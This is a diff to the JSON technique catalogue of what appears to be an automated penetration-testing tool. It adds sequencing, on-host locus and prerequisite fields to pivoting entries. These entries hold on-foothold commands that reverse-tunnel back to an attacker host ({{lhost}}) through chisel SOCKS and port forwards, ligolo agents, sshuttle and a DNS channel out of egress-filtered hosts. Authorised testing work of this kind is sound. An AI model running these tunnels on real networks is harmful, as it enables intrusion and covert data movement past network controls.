@@ -25,6 +25,8 @@
       ],
       "priority": 64,
       "autonomy": "approve",
+      "sequence": true,
+      "stepper": true,
       "proves": "a working SOCKS tunnel into the network the foothold sits on",
       "does_not_prove": "that any particular internal host is reachable, only a scan through the tunnel shows that",
       "refs": [
@@ -37,11 +39,13 @@
         },
         {
           "tool": "chisel",
+          "locus": "onhost",
           "run": "chisel client {{lhost}}:8080 R:socks"
         },
         {
           "tool": "chisel",
           "locus": "onhost",
+          "alt": true,
           "run": "./chisel client {{lhost}}:8080 R:{{local_port|3306}}:127.0.0.1:{{local_port|3306}}",
           "note": "Forward a single loopback-bound service on the foothold host (such as 127.0.0.1:3306 or 127.0.0.1:8080) directly back to 127.0.0.1 on Kali."
         }
@@ -60,7 +64,10 @@
       ],
       "requires_any": [
         "foothold.linux",
+        "foothold.windows",
         "access.shell",
+        "host.multihomed",
+        "scan.local.routes",
         "scan.local.neighbors"
       ],
       "produces": [
@@ -70,8 +77,10 @@
         "pivot.active",
         "tunnel.route"
       ],
-      "priority": 62,
+      "priority": 66,
       "autonomy": "approve",
+      "sequence": true,
+      "stepper": true,
       "proves": "a routed pivot onto the foothold's network",
       "does_not_prove": "that any specific internal host is reachable until a scan confirms it",
       "refs": [
@@ -84,6 +93,7 @@
         },
         {
           "tool": "ligolo-agent",
+          "locus": "onhost",
           "run": "agent -connect {{lhost}}:11601 -ignore-cert"
         }
       ]
@@ -98,7 +108,8 @@
         "sshuttle"
       ],
       "requires_any": [
-        "foothold.linux"
+        "foothold.linux",
+        "ssh.authenticated"
       ],
       "produces": [
         "tunnel.route"
@@ -201,6 +212,7 @@
       "priority": 30,
       "autonomy": "approve",
       "sequence": true,
+      "stepper": true,
       "proves": "a working data channel over DNS from an otherwise egress-filtered host",
       "does_not_prove": "a channel where the host cannot resolve arbitrary external names",
       "report": {
